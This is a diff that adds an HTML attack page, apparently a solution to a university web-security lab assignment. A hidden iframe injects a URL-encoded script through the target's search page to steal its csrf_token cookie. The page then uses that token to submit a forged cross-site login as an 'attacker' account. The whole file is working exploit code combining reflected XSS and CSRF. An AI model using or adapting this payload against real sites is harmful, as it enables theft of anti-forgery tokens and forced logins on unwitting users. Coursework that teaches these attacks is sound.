@@ -1,0 +1,24 @@
+<html><body>
+    <script src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <iframe id="search" src="https://project2.eecs388.org/search?q=%3Cscript%3E%0Amsg%20%3D%20document.cookie.match%28new%20RegExp%28%27%28%5E%7C%20%29%27%20%2B%27csrf_token%27%20%2B%20%27%3D%28%5B%5E%3B%5D%2B%29%27%29%29%5B2%5D%3B%0Aconsole.log%28msg%29%3B%0Aparent.postMessage%28msg%29%3C%2Fscript%3E" hidden></iframe>
+    <form id = "form1" method = "post" action = "https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0" style = "display: none">
+        <input name = "username" value = "attacker">
+        <input name = "password" value = "l33th4x">
+    </form>
+    <script>
+        window.addEventListener("message", function(c) {
+            var input = document.createElement("input");
+            input.type = "hidden";
+            input.name = "csrf_token";
+            input.value = new String(c.data);
+            document.getElementById("form1").appendChild(input);
+        $.ajax({
+                type: 'POST',
+                data: $('#form1').serialize(),
+                url: 'https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0',
+                xhrFields: {withCredentials: true}
+            });
+        }, false);
+    </script>
+ 
+ </body></html>
